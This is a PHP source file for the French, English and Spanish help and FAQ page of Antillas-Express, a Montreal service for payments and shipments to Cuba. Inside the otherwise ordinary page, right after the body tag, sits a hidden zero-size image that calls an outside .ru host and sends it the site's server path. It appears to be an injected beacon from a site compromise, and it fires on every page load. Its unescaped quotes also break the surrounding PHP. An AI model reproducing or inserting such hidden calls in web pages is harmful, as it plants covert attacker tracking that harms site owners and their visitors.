<?php
include('lib/config.php');

/*if( InfoBannie( "76.169.167.88" ) )
	$infoIP = 'vrai';
else
	$infoIP = 'faux';
		<tr>
			<td>
				Test : $infoIP
			</td>
		</tr>*/

echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=Liste de client' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body topmargin='16px' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='4' cellspacing='0' align='$Enligne' border='1' >		
	  	<tr> 
	    	<td>";

?>

 <?if ($_SESSION['langue']=="fr"){?>
<blockquote>
  <p><span> <font color='#D00E29' size='3' face='verdana'><center><b>Aide</b></font></center></span> </p>
<ul>
  <li class="normalText"><a href="#1">Les transactions en ligne sont-elles s&eacute;curitaires ?</a></li>
  <li class="normalText"><a href="#2">Mes informations sont-elles confidentielles ?</a></li>
  <li class="normalText"><a href="#3">Avez-vous un bureau à Cuba ?</a></li>
  <li class="normalText"><a href="#4">Puis-je commander de partout dans le monde ?</a></li>
  <li class="normalText"><a href="#5">Quel mode de paiement acceptez-vous ?</a></li>
  <li class="normalText"><a href="#6">Dans quelle devise suis-je facturée ?</a></li>
  <li class="normalText"><a href="#7">Y-a-t-il des frais de transaction ?</a></li>
  <li class="normalText"><a href="#8">Quels sont les délais de livraison d'un produit ?</a></li>
  <li class="normalText"><a href="#9">Est-ce que je reçois confirmation du service ?</a></li>
  <li class="normalText"><a href="#10">Que se passe-t-il si la commande ne se rend pas à destination?</a></li>
  <li class="normalText"><a href="#11">Que faire si j'éprouve un problème technique durant une session?</a></li>
  <li class="normalText"><a href="#12">à qui se m'adresse si je veux parler à un agent ?</a></li>
</ul>
<hr size="2">
<p class="normalText"><span class="normalTextBold"><a name="1"></a>Les transactions 
	en ligne sont-elles sécuritaires ?</span><br>
	Oui, très sécuritaire. Détenteur d'un Certificat de marchand Internet, Antillas-Express.com
	fait usage des plus récentes innovations technologiques
	en matière de commerce électronique. L'entreprise a en effet retenu la solution
	d'affaires (transaction, validation du crédit et paiement en ligne) développée
	par le groupe Moneris.
</p>
<p class="normalText">Vous êtes toutefois responsable du maintien de la
  confidentialité de votre nom d'utilisateur (code d'accès)
  et de votre mot de passe. Antillas-Express ne pourra être tenue responsable
  d'un usage non autorisé de votre compte. Dans le cas où la confidentialité;
  de ces renseignements viendrait à être compromise, veuillez en
  avertir notre service à la clientèle le plus tôt possible
  afin d'éviter une éventuelle utilisation frauduleuse de votre
  identité. </p>
<p class="normalText"><span class="normalTextBold"><a name="2"></a>Mes informations 
  sont-elles confidentielles ?</span><br>
  Tout à fait. Antillas-Express s'est engagée à protéger
  la confidentialité et la sécurité des renseignements personnels
  obtenus à l'occasion de ses relations commerciales avec la clientèle.
  Nous avons pris toutes les mesures techniques, logistiques et organisationnelles 
  nécessaires pour faire respecter cette volonté.</p>
<p class="normalText">Les politiques et les pratiques mises de l'avant sont
  élaborées conformément à la Loi sur la protection
  des renseignements personnels et les documents électroniques (LPRP/DE)
  et à toute autre loi provinciale correspondante sur la protection des
  renseignements personnels. Pour en savoir plus, consultez notre <a href="confidentialite.php">Politique de 
  confidentialité.</a></p>
<p class="normalText"><span class="normalTextBold"><a name="3"></a>Avez-vous un 
  bureau à Cuba ?</span><br>
  Notre place d'affaires principale est située à Montréal
  au Canada. Mais nous avons des représentants dans toutes les régions
  de l'île cubaine avec qui nous sommes constamment en rapport étroit.</p>
<p class="normalText"><span class="normalTextBold"><a name="4"></a>Puis-je commander 
  de partout dans le monde ?</span><br>
  Oui, bien sûr. Les transactions en ligne sur le site d'Antillas-Express.com
  sont possibles en tout temps pour peu que vous ayez un ordinateur, une connexion 
  Internet et une suite de logiciels compatibles. Vous pouvez également
  entrer en contact directement avec l'un de nos agents : </p>
<p class="normalText"><span class="normalTextBold">Coordonnées :</span><br>
  <span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br>
  <span class="normalTextBold">Courriel :</span> <a href="mailto:<?=hexentities($param['email_info']);?>"><?=hexentities($param['email_info']);?></a><br>
  <span class="normalTextBold">Site :</span> <a href="<?=$entr_url?>" target='_BLANK'><?=$entr_url?></a></p>
<p class="normalText"><?=$txt['Horaire'];?><br>
  <br>
  <a name="5"></a>Quel mode de paiement acceptez-vous ?</span><br>
  Nous acceptons les paiements en ligne par carte de crédit (Visa, Master
  Card, American Express), par Money Order International, par cheques certifiés
  et par Western Union. à notre bureau de Montréal, vous pouvez
  payer sur place par carte de débit.</p>
<p class="normalText"><span class="normalTextBold"><a name="6"></a>Dans quelle 
  devise suis-je facturée ?</span><br>
  Les prix en vigueur dans le catalogue des produits et services du site Antillas-Express.com 
  sont affichés en dollars américains. Le total de la facture est
  ensuite converti dans la devise de votre pays que vous sélectionnez dans
  notre convertisseur de taux de change en ligne fonctionnant en temps réel
  dans le panier d'achat.</p>
<p class="normalText"><span class="normalTextBold"><a name="7"></a>Y-a-t-il des 
  frais de transaction ?</span><br>
  Oui. Les prix des produits et services ne comprennent ni les frais de transaction 
  bancaire auxquels s'ajoutent des coûts ni de livraison ou de transport
  dans certains cas. Ils varient selon la nature et l'ampleur de l'opération.
  La ventilation des frais apparaît dans le tableau de présentation
  de chaque item que vous sélectionnez.</p>
<p class="normalText"><span class="normalTextBold"><a name="8"></a>Quels sont 
  les délais de livraison d'un produit ?</span><br>
  Le délai varie selon le type de transaction. Par exemple, le transfert
  de fonds bancaire peut se faire en 24 Hs. dès la journée même
  de votre demande, tandis que l'envoi d'argent à domicile
  nécessite quelques jours. Le temps nécessaire à la livraison
  de chaque produit commandé en ligne est mentionné à titre
  indicatif dans le catalogue Internet.</p>
<p class="normalText"><span class="normalTextBold"><a name="9"></a>Est-ce que 
  je reçois confirmation de la livraison du service ou produit ?</span><br>
  Il va sans dire. Quand vous validez la transaction par carte de crédit
  en ligne, vous voyez apparaître à l'écran de votre
  ordinateur la confirmation de l'achat. Vous recevrez une confirmation
  par courriel, et aussi il apparaîtra dans votre état
  de compte.</p>
<p class="normalText"><span class="normalTextBold"><a name="10"></a>Que se passe-t-il 
  si la commande ne se rend pas à destination?</span><br>
  Communiquez immédiatement avec le service à la clientèle
  d'Antillas-Express afin d'éclaircir la situation. S'il
  n'y a pas d'irrégularités de votre part et de problèmes
  hors de notre contrôle (lire Termes et conditions), vous serez remboursé
  ou vous obtiendrez un crédit d'une valeur équivalente sur
  toute transaction éventuelle.</p>
<p class="normalText"><span class="normalTextBold"><a name="11"></a>Que faire 
  si j'éprouve un problème technique durant une session ?</span><br>
  Si vous n'avez pas franchi l'étape de la validation de la
  carte de crédit, vous pouvez annuler la transaction sans problème
  ou quitter l'application de votre fureteur Internet. Il serait ensuite
  utile de vérifier l'état de santé de votre ordinateur,
  la qualité de votre connexion Internet et la compatibilité de
  votre suite de logiciels avec notre plateforme transactionnelle Internet. Si 
  le problème persiste, adressez-vous à l'un de nos agents
  :</p>
<p class="normalText"><span class="normalTextBold">Coordonnées :</span><br>
  <span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br>
  <span class="normalTextBold">Courriel :</span> 
  <a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a><br>
  <span class="normalTextBold">Site :</span> 
  <a href="<?=$entr_url?>" target='_BLANK'><?=$entr_url?></a></p>
<p class="normalText"><?=$txt['Horaire'];?><br></p>
</span><span class="normalTextBold"><a name="12"></a>Comment faire 
  si je veux parler à un agent de toute urgence ?</span><br>
  En dehors des heures d'ouverture de notre place d'affaires à
  Montréal, envoyez-nous un message par courriel (en indiquant la mention
  Urgent dans l'objet) à l'adresse suivante : ventes@antillas-express.com
  Vous pouvez également laisser un message à notre boîte vocale
  quand le bureau est fermé ou parler directement à un agent :</p>
<?} 
elseif ($_SESSION['langue']=="en"){?>
	<blockquote>
  		<p><span> <font color='#D00E29' size='3' face='verdana'><center><b>Help</b></font></center></span> </p>
		<ul>
		<li class="normalText"><a href="#1">Are the on line transactions secured?</a></li>
		<li><span class="normalText"><a href="#2">Is my information kept confidential? </a> </span></li>
		<li><span class="normalText"><a href="#3">Do you have an office in Cuba? </a></span></li>
		<li><span class="normalText"><a href="#4">Can I order from all over the world? </a> </span></li>
		<li><span class="normalText"><a href="#5">What method of payment do you accept?</a> </span></li>
		<li><span class="normalText"><a href="#6">In what currency am I invoiced? </a></span></li>
		<li><span class="normalText"><a href="#7">Are there expenses of transaction? </a> </span></li>
		<li><span class="normalText"><a href="#8">What are the delivery times of a product?</a> </span></li>
		<li><span class="normalText"><a href="#9">Do I receive confirmation of the service? </a></span></li>
		<li><span class="normalText"><a href="#10">What happens if the order doesn't arrive in destination? </a></span></li>
		<li><span class="normalText"><a href="#11">What to do if I experiment a technical problem during a session? </a></span></li>
		<li><span class="normalText"><a href="#12">To whom should I address if I want to speak to an agent?</a> </span></li>
		</ul>
		<hr>
		<p><span class="normalTextBold"><a name="1"></a>Are the on line 
		transactions secured?<br>
		</span><span class="normalText">Yes, very secured. Possessor of a merchant
		Internet Certificate, Antillas-Express.com makes use of the most recent
		technological innovations concerning electronic commerce. The enterprise
		kept the business solution indeed (transaction, validation of the credit
		and on line payment) developed by the Moneris group.<br>
		<br>
		You are however responsible of the maintenance of the confidentiality 
		of your user's name (code of access) and of your password. Antillas-Express 
		won't be able to be held responsible for a non authorized use 
		of your account. In the case where the confidentiality of this 
		information would come to be compromised, please warn our service 
		as soon as possible by calling Customer Service in order to avoid 
		a possible fraudulent use of your identity. </span><span class="normalTextBold"><br>
		<br>
		<a name="2"></a>Is my information confidential?<br>
		</span><span class="normalText">Of course. Antillas-Express committed 
		to protect confidentiality and the security of the personal information 
		gotten on the occasion of the commercial relations with the customer. 
		We took all necessary technical, logistical and organizational 
		measures to make respect this will. <br>
		<br>
		The policies and the practices are elaborated in accordance with 
		the Law on the protection of the personal information and the 
		electronic documents (LPRP/DE) and to all other corresponding 
		provincial law on the protection of the personal information. 
		To know more, consult our <a href="confidentialite.php">Politics of confidentiality.</a></span><br>
		<br>
		<span class="normalTextBold"><a name="3"></a>Do you have an office 
		in Cuba?<br>
		</span><span class="normalText">Our main business place is situated 
		in Montreal, Canada. But we have some representatives in all regions 
		of the Cuban island to whom we are constantly in narrow communication. 
		<br>
		<br>
		</span><span class="normalTextBold"><a name="4"></a>Can I order 
		from all over the world?</span><span class="normalText"><br>
		Yes, of course. The on line transactions on the site Antillas-Express.com 
		are possible in all time if. you only need to have a computer, 
		an Internet connection and a suite of compatible software. You 
		can also enter directly in contact with one our agents: <br>
		<br>
		</span>
		<p class="normalText"><span class="normalTextBold">Customer Service:</span><span class="normalText"> 
		<br>
		</span><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br>
		</span><span class="normalTextBold">E-mail:</span><span class="normalText"> 
		<a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a> 
		<br>
		</span><span class="normalTextBold">Site</span><span class="normalText">: 
		<a href="<?=$entr_url?>" target='_BLANK'><?=$entr_url?></a> 
		<br>
		<br>
		<?=$txt['Horaire'];?><br>
		<br></p>
		<span class="normalTextBold"><a name="5"></a>What method of payment 
		do you accept?<br>
		</span><span class="normalText">We accept the on line payments 
		by credit card (Visa, Master Card, American Express), by International 
		Money Order, by certified checks or cashier checks and by Western 
		Union. At our office in Montreal, you can pay there by debit card. 
		</span><br>
		<br>
		<span class="normalTextBold"><a name="6"></a>In what currency 
		am I invoiced?<br>
		</span><span class="normalText">The prices of the products in 
		the catalog and services in the Antillas-Express.com site are 
		displayed in American dollars. The total of the invoice is converted 
		then into the currency of the country that you select in our on 
		line exchange rate converter functioning in real time in the basket 
		of purchase. </span><br>
		<br>
		<span class="normalTextBold"><a name="7"></a>Are there expenses 
		of transaction?</span><br>
		<span class="normalText">Yes. The prices of the products and services 
		don't include the cost of the banking transaction expenses to 
		which must be added nor delivery or transportation in some cases. 
		They vary according to the nature and the size of the operation. 
		The explanation of the expenses appears in the presentation of 
		every item that you select. </span><br>
		<br>
		
		<span class="normalTextBold"><a name="8"></a>What are the delivery 
		times of a product?</span><br>
		<span class="normalText">The delay varies according to the type 
		of transaction. For example, the banking fund transfer can be 
		made in 24 Hs since the very day of your demand, while the home 
		delivery of money requires some more days. The time necessary 
		to the delivery of every product ordered on line is mentioned 
		for information only in the Internet catalog. </span><br>
		<br>
		<span class="normalTextBold"><a name="9"></a>Do I receive confirmation 
		of the delivery of the service or product?<br>
		</span><span class="normalText">Yes. When you validate the transaction 
		by on line credit card, the confirmation of the purchase appears 
		on the screen of your computer. You will receive a confirmation 
		by e-mail, and also it will appear in your account statement. 
		</span><br>
		<br>
		<span class="normalTextBold"><a name="10"></a>What happens if 
		the order doesn't arrive in destination?<br>
		</span><span class="normalText">Immediately, ou must communicate 
		with Customer Service of Antillas-Express in order to solve the 
		situation. If there are no irregularities of your part or problems 
		out of our control (read Terms and conditions), you will be repaid 
		or you will get a credit of an equivalent value on all possible 
		transaction. <br>
		</span><br>
		<span class="normalTextBold"><a name="11"></a>What to do if I 
		experiment a technical problem during a session?<br>
		</span><span class="normalText">If you didn't clear the stage 
		of the validation of the credit card, you can annul the transaction 
		without problem or leave the application of your Internet navigator. 
		It would be then useful to verify the state of your computer, 
		the quality of your Internet connection and the compatibility 
		of your software with our internet transactional platform. If 
		the problem persists, address to one our agents: <br><br>
		</span>
		<p class="normalText"><span class="normalTextBold">Customer Service:</span><span class="normalText"> 
		<br>
		</span><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br>
		</span><span class="normalTextBold">E-mail:</span><span class="normalText"> 
		<a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a> 
		<br>
		</span><span class="normalTextBold">Site</span><span class="normalText">: 
		<a href="<?=$entr_url?>" target='_BLANK'><?=$entr_url?></a> 
		<br>
		<br>
		<?=$txt['Horaire'];?><br>
		<br></p>
		<span class="normalTextBold"><a name="12"></a>What if I want to speak to an agent urgently?</span><br>
		<span class="normalText">Outside of the hours of opening of our 
		business place in Montreal, send us a message by e-mail (while 
		indicating the Urgent mention in the object) to the following 
		address: <a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a>. 
		You can also leave a message into our vocal box when the office 
		is closed or speak directly to an agent: </span><br>
		<br>
<?} 
else {?>
<blockquote>
  <p><span> <font color='#D00E29' size='3' face='verdana'><center><b>Ayuda</b></font></center></span> </p>
<ul>
  <li class="normalText"><a href="#1">Las transacciones en línea son seguras ?</a></li>
  <li class="normalText"><a href="#2"> Mi informaci&oacute;n permanece confidencial ?</a></li>
  <li class="normalText"><a href="#3">Existe una oficina en Cuba ?</a></li>
  <li class="normalText"><a href="#4">Pueden hacerse los pedidos desde cualquier parte del mundo ?</a></li>
  <li class="normalText"><a href="#5">Qué medio de pago es aceptado ?</a></li>
  <li class="normalText"><a href="#6">En qué moneda es facturado mi pedido ?</a></li>
  <li class="normalText"><a href="#7">Existen costos de transacci&oacute;n ?</a></li>
  <li class="normalText"><a href="#8">Cu&aacute;l es la demora en la entrega de un producto ?</a></li>
  <li class="normalText"><a href="#9">Recibiré una confirmaci&oacute;n de la compra del servicio o producto ?</a></li>
  <li class="normalText"><a href="#10">Qué sucede si mi pedido no llega a su destino ?</a></li>
  <li class="normalText"><a href="#11">Qué hacer si sucede un problema técnico durante una sesi&oacute;n ?</a></li>
  <li class="normalText"><a href="#12">A quién debo dirigirme si deseo hablar con uno de vuestros agentes ?</a></li>
</ul>
<hr size="2">
<p class="normalText"><span class="normalTextBold"><a name="1"></a>Las transacciones 
  en línea son seguras ?<br>
  </span><span class="normalText">SI, muy seguras. Poseedor de un certificado 
  de comercio internet, Antillas Express hace uso de las m&aacute;s recientes 
  innovaciones tecnol&oacute;gicas en materia de comercio electr&oacute;nico. 
  La empresa a optado por la soluci&oacute;n de transacci&oacute;n, validaci&oacute;n 
  de crédito y pago en l&iacute;nea de (MONERIS)</span></p>
<p><span class="normalText">De todas maneras, usted es responsable de mantener 
  la confidencialidad de su nombre de usuario (c&oacute;digo de acceso) y de vuestra 
  clave. Antillas-Express no podr&aacute; ser considerada responsable de un uso 
  no autorizado de su cuenta. En el caso que usted crea que sus datos pudieran 
  estar comprometidos, s&iacute;rvase advertir a nuestro servicio a la clientela 
  lo m&aacute;s pronto posible para prevenir la eventual utilisaci&oacute;n fraudulenta 
  de su identidad.</span></p>
<p class="normalText"><span class="normalTextBold"><a name="2"></a>Mi informaci&oacute;n 
  permanece confidencial ?<br>
  </span><span class="normalText">Por supuesto que si. Antillas Express se compromete 
  a proteger la confidencialidad y la seguridad de su informaci&oacute;n personal 
  obtenida en ocasi&oacute;n de sus relaciones comerciales con su clientela. Hemos 
  tenido en cuenta todas las medidas técnicas, log&iacute;sticas y organizacionales
  necesarias para hacer respetar esa voluntad.</span></p>
<p class="normalText">Las pol&iacute;ticas y las pr&aacute;cticas presentadas 
  desde un inicio son conformes a la Ley de protecci&oacute;n de la informaci&oacute;n 
  personal y de los documentos electr&oacute;nicos (LPRP/DE) y a toda otra ley 
  provincial correspondiente sobre la protecci&oacute;n de la inforamci&oacute;n 
  personal. Para saber m&aacute;s, consulte nuestra <a href="confidentialite.php">Politica de confidencialidad</a>.</p>
<p class="normalText"><span class="normalTextBold"><a name="3"></a>Existe una 
  oficina en Cuba ?<br>
  </span>Nuestra oficina principal est&aacute; situada en Montreal, Canada. Pero 
  tenemos nuestros representantes en todas las regiones de la isla de Cuba con 
  quienes nos mantenemos constantemente en contacto..</p>
<p class="normalText"><span class="normalTextBold"><a name="4"></a>Pueden hacerse 
  los pedidos desde cualquier parte del mundo ?<br>
  </span>Si, por supuesto. Las transacciones en l&iacute;nea en el sitio Antillas 
  Express son posibles en todo tiempo con solo disponer de un ordenador, una conexi&oacute;n 
  a internet y un conjunto de programas compatibles. Puede igualmente entrar en 
  contacto directamente con uno de nuestros agentes:</p>
<p class="normalText"><span class="normalTextBold">Direcci&oacute;n</span><br>
  <span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br>
  <span class="normalTextBold">E-mail</span> : <a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a><br>
  <span class="normalTextBold">Sitio internet</span> : <a href="<?=$entr_url?>" target='_BLANK'><?=$entr_url?></a></p>
<p class="normalText"><?=$txt['Horaire'];?><br>
  </span> <span class="normalTextBold"><br>
  <a name="5"></a>Qué medio de pago es aceptado ?<br>
  </span><span class="normalText">Nosotros aceptamos los pagos en l&iacute;nea 
  mediante tarjeta de crédito (Visa, Master Card, American Express), Money
  Order Internacional, cheques certificados de su bancoy Western Union. En nuestra 
  oficina de Montreal, usted puede pagar en efectivo o tarjeta de débito.</span></p>
<p class="normalText"><span class="normalTextBold"><a name="6"></a>En qué
  moneda es facturado mi pedido ?<br>
  </span>Los precios vigentes en el cat&aacute;logo de productos y servicios del 
  sitio de Antillas Express son mostrados en CUC. El total 
  de la factura es con posterioridad convertido a la moneda de su pa&iacute;s 
  que usted seleccione en nuestro convertidor de moneda en l&iacute;nea funcionando 
  en tiempo real.</p>
<p class="normalText"><span class="normalTextBold"><a name="7"></a>Existen costos 
  de transacci&oacute;n ?<br>
  </span>No. Todo esta incluido en el costo.</p>
<p class="normalText"><span class="normalTextBold"><a name="8"></a>Cu&aacute;l 
  es la demora en la entrega de un producto ?<br>
  </span>La demora var&iacute;a seg&uacute;n el tipo de transacci&oacute;n. El 
  tiempo necesario para la entrega de cada producto solicitado es mencionado a 
  t&iacute;tulo indicativo en el cat&aacute;logo en l&iacute;nea.</p>
<p class="normalText"><span class="normalTextBold"><a name="9"></a>Recibiré
  una confirmaci&oacute;n de la compra del servicio o producto ?<br>
  </span>Si, por supuesto. Cuando usted valida la transacci&oacute;n realizada 
  con tarjeta de crédito en l&iacute;nea, usted ver&aacute; en su ordenador
  una pantalla con la confirmaci&oacute;n de su compra. Usted recibir&aacute; 
  una confirmaci&oacute;n por correo electr&oacute;nico, y adem&aacute;s aparecer&aacute; 
  en vuestro estado de cuenta.</p>
<p class="normalText"><span class="normalTextBold"><a name="10"></a>Qué
  sucede si mi pedido no llega a su destino ?<br>
  </span>Comun&iacute;quese inmediatamente con el servicio a la clientela de Antillas 
  Express a fin de esclarecer la situaci&oacute;n. Si no hay irregularidades de 
  vuestra parte ni problemas fuera de nuestro control (lea: Términos y
  condiciones), usted recibir&aacute; un reembolso u obtendr&aacute; un crédito
  de un valor equivalente sobre toda transacci&oacute;n eventual.</p>
<p class="normalText"><span class="normalTextBold"><a name="11"></a>Qué
  hacer si se presenta un problema técnico durante una sesi&oacute;n ?<br>
  </span>Si a&uacute;n no ha traspasado la etapa de la validaci&oacute;n de la 
  transacci&oacute;n de la tarjeta de crédito, Usted puede anular la transacci&oacute;n
  sin problemas o abandonar la aplicaci&oacute;n. Ser&aacute; aconsejable, luego, 
  verificar el estado de su ordenador, la calidad de su conexi&oacute;n a internet 
  y la compatibilidad de sus programas instalados. Si el problema persiste, dir&iacute;jase 
  a uno de nuestros agentes:</p>
<p class="normalText"><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br>
  <span class="normalTextBold">E-mail</span> : <a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a><br>
  <span class="normalTextBold">Sitio internet</span> : 
  <a href="<?=$entr_url?>" target='_BLANK'><?=$entr_url?></a></p>
<p class="normalText"><?=$txt['Horaire'];?><br></span></p>
<p class="normalText"><span class="normalTextBold"><a name="12"></a>A quién
  debo dirigirme si deseo hablar con uno de vuestros agentes ?<br>
  </span>Fuera del horario de atenci&oacute;n en Montreal, env&iacute;enos un 
  mensaje por correo electr&oacute;nico, mencionando en el asunto la palabra URGENTE 
  a la direcci&oacute;n siguiente: <a href="mailto:<?php echo hexentities($param['email_info']);?>"><?php echo hexentities($param['email_info']);?></a>. 
  También puede dejar un mensaje a uno de nuestros agentes o hablar directamente
  con ellos:</p>
<?}?>
<p class="normalText"><span class="normalTextBold"><?=$txt['form_telephone'];?> :</span><br>
			<?=$param['telephone_client'];?><br><br>                
			<span class="normalTextBold"><?=$txt['form_telecopieur'];?> :</span><br>
			<?=$param['fax_client'];?><br><br></p>
</blockquote>
<?php
	if( isset( $_SERVER['HTTPS'] ) && !strcasecmp("on", $_SERVER['HTTPS']) ) 
		echo "&nbsp;";
	else {
		echo "<p class='normalText' align='right'>
					<a href='http://validator.w3.org/check?uri=referer'>
						<img src='http://www.w3.org/Icons/valid-html40' alt='Valid HTML 4.0 Frameset' height='31' width='88'></a>
				</p>";
	}
?>
			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
<script language='JavaScript1.2'>
	function Rafraichie(){
		window.location.reload();
	} // Rafraichie
</script>
</body>
</html>
